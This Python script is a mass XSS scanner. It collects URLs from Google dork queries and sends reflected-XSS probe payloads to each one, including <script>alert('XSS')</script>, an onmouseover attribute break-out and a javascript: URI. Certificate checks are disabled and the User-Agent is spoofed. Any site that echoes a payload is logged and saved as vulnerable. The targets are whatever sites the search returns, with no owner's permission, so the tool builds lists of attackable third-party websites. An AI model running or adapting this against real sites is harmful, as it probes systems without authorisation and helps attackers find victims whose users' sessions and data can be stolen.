#!/usr/bin/env python3
import argparse
import requests
from googlesearch import search
from urllib.parse import urlparse, quote
from time import sleep

class Colors:
    HEADER = "\033[95m"
    BLUE = "\033[94m"
    CYAN = "\033[96m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    RED = "\033[91m"
    END = "\033[0m"
    BOLD = "\033[1m"
    UNDERLINE = "\033[4m"

def show_banner():
    print(f"""{Colors.CYAN}
    ╔══════════════════════════════════════════════╗
    ║{Colors.BOLD}      MODERN XSS SCANNER (External Dork){Colors.END}{Colors.CYAN}    ║
    ║                                              ║
    ║    Scan websites for XSS vulnerabilities     ║
    ║    using Google Dorks from external input    ║
    ╚══════════════════════════════════════════════╝{Colors.END}
    """)

def load_dorks(source):
    """Load dorks from file or command line input"""
    if source.startswith('file:'):
        filename = source[5:]
        try:
            with open(filename, 'r') as f:
                return [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"{Colors.RED}[!] File not found: {filename}{Colors.END}")
            return []
    else:
        return [source]

def scan_xss(url, payload):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    }
    
    try:
        test_url = f"{url}{quote(payload)}" if "=" in url else f"{url}?q={quote(payload)}"
        response = requests.get(test_url, headers=headers, timeout=10, verify=False)
        
        if payload in response.text:
            return True
    except Exception:
        pass
    return False

def check_site(url):
    payloads = [
        "<script>alert('XSS')</script>",
        "'><script>alert('XSS')</script>",
        "\" onmouseover=\"alert('XSS')\"",
        "javascript:alert('XSS')"
    ]
    
    for payload in payloads:
        if scan_xss(url, payload):
            print(f"{Colors.RED}[VULNERABLE] {url}{Colors.END}")
            print(f"{Colors.YELLOW}Payload: {payload}{Colors.END}")
            return True
    return False

def google_search(dork, max_results=5, delay=2):
    print(f"\n{Colors.BLUE}[+] Searching for: {Colors.BOLD}{dork}{Colors.END}")
    vulnerable = []
    
    try:
        for url in search(dork, num_results=max_results, sleep_interval=delay):
            if urlparse(url).scheme in ('http', 'https'):
                print(f"{Colors.GREEN}[Checking] {url}{Colors.END}")
                if check_site(url):
                    vulnerable.append(url)
    except Exception as e:
        print(f"{Colors.RED}[!] Search error: {e}{Colors.END}")
    
    return vulnerable

def main():
    show_banner()
    
    parser = argparse.ArgumentParser(description='XSS Scanner with External Dork Input')
    parser.add_argument('-d', '--dork', help='Single Google dork query')
    parser.add_argument('-f', '--file', help='File containing multiple dorks (one per line)')
    parser.add_argument('-o', '--output', help='Output file for results')
    parser.add_argument('-n', '--num-results', type=int, default=5, help='Number of results per dork')
    
    args = parser.parse_args()
    
    if not args.dork and not args.file:
        parser.print_help()
        return
    
    dorks = []
    if args.dork:
        dorks.append(args.dork)
    if args.file:
        dorks.extend(load_dorks(f"file:{args.file}"))
    
    all_vulnerable = []
    
    for dork in dorks:
        vulnerable = google_search(dork, args.num_results)
        all_vulnerable.extend(vulnerable)
    
    if all_vulnerable:
        print(f"\n{Colors.RED}{Colors.BOLD}=== VULNERABLE SITES FOUND ==={Colors.END}")
        for site in all_vulnerable:
            print(f"- {site}")
        
        if args.output:
            with open(args.output, 'w') as f:
                f.write("\n".join(all_vulnerable))
            print(f"\n{Colors.GREEN}Results saved to {args.output}{Colors.END}")
    else:
        print(f"\n{Colors.YELLOW}No vulnerable sites found.{Colors.END}")

if __name__ == "__main__":
    main()
